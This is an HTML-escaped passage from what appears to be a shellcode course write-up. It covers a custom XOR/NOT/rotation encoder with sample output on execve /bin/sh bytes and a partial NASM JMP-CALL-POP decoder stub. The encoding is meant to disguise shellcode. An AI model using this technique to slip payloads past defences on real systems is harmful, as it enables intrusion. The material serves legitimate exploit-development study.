&lt;li&gt;&lt;code&gt;XOR&lt;/code&gt; each byte with the value of &lt;code&gt;shellcode_length_least_byte&lt;/code&gt;, made exception for bytes equal to it&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NOT&lt;/code&gt; each byte&lt;/li&gt;
&lt;li&gt;Rotate bytes&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;if the index of the byte is &lt;code&gt;even&lt;/code&gt;, then rotate to the left (&lt;code&gt;ROL&lt;/code&gt;) &lt;code&gt;ROT_EVEN&lt;/code&gt; times&lt;/li&gt;
&lt;li&gt;if the index of the byte is &lt;code&gt;odd&lt;/code&gt;, then rotate to the right (&lt;code&gt;ROR&lt;/code&gt;) &lt;code&gt;ROT_ODD&lt;/code&gt; times&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once you execute the script, it shows how to use it:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 encoder.py &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# usage: encoder.py [-h] -i INPUT [-o OUTPUT]&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# optional arguments:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   -h, --help            show this help message and exit&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   -i INPUT, --input INPUT&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#                         File containing shellcode to encode&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   -o OUTPUT, --output OUTPUT&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#                         Store the encoded shellcode in this file&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you pass the correct arguments, in encodes your shellcode and &lt;em&gt;asserts&lt;/em&gt; that it can be decoded correctly:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shellcode.bin

python3 encoder.py &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ./shellcode.bin &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/encoded.binc

&lt;span class=&quot;c&quot;&gt;# [+] Non-encoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Non-encoded shellcode length: 28 bytes&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Rotations for even-index bytes: 2 (hex: 0x2)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Rotations for odd-index bytes: 168 (hex: 0xa8)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: 30 (hex: 0x1e)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: 168 (hex: 0xa8)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Helper bytes for decoding (HEX): 02a81ea8&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# [#] Encoding ...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Encoded shellcode (HEX): 02a81ea8ad21f5897ace3d89fbce2a83bb512368196cf2c5e36cf4c5e32cc1eb&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Encoded shellcode length: 32 bytes&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# [#] Decoding ...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Decoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The line starting with &lt;strong&gt;Assembly data:&lt;/strong&gt; contains the bytes you can copy-paste into the NASM skeleton file and use them with the &lt;code&gt;JMP-CALL-POP&lt;/code&gt; technique:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;assembly-decoder&quot;&gt;Assembly Decoder&lt;/h2&gt;
&lt;p&gt;First step is to prepare the skeleton of the decoder. I used the same shown in the &lt;code&gt;Episode 31&lt;/code&gt; of the course, employed in conjunction with the &lt;code&gt;Insertion&lt;/code&gt; encoder:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; Author: Robert C. Raducioiu (rbct)&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_start&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.text&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CallShellcode&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;Shellcode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;Decode:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; ...&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Decode&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;CallShellcode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Shellcode&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;encoded:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x83&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xeb&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As you can see, it is based on the famous &lt;code&gt;JMP-CALL-POP&lt;/code&gt; technique in order to get a reference to the shellcode. I chose to use this because the other one I knew (pushing groups of &lt;code&gt;4&lt;/code&gt; bytes on the stack) would increase the size of the shellcode.&lt;/p&gt;
&lt;p&gt;Anyways, now the routine &lt;code&gt;Decode&lt;/code&gt; must be implemented to decode the encoded shellcode. As mentioned previously, the first decoding operation is the following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;XOR&lt;/code&gt; each byte with the value of &lt;code&gt;shellcode_length_least_byte&lt;/code&gt;, made exception for bytes equal to it&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; clear some registers for later use&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CallShellcode&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;Shellcode:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; get a reference to the encoded shellcode&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; copy the address of the first encoded assembly instruction into EBX&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   +4 -&amp;gt; skip the first 4 auxiliary bytes &lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; copy ROT_EVEN and ROT_ODD into AX&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   AL: ROT_EVEN&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   AH: ROT_ODD&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;WORD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; copy the XOR-ed length of the shellcode into CX&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   and XOR it again with ROT_EVEN:ROT_ODD to decode it&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;WORD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; copy the length of the shellcode on the stack, for later use&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Prepare registers before actually jumping to the &lt;code&gt;Decode&lt;/code&gt; routine
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;Decode:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; copy the length of the shellcode (previous 'push ecx') into DL&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; and check if the two bytes are the same&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; if they are equal jump to the next decoding operation: NOT&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;je&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;NotDecode&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; if they aren't the equal, then XOR the byte with 'shellcode_length_least_byte'&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   which is the length of the shellcode XOR-ed with ROT_EVEN&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Perform the 1st Decoding operation (&lt;code&gt;XOR&lt;/code&gt;) or move to the next one, based on the commented condition
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;CallShellcode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Shellcode&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;encoded:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x89&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x83&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xeb&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now that the 1st operation is done, it's time to move to the 2nd one:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;Decode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;je&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;NotDecode&lt;/span&gt;

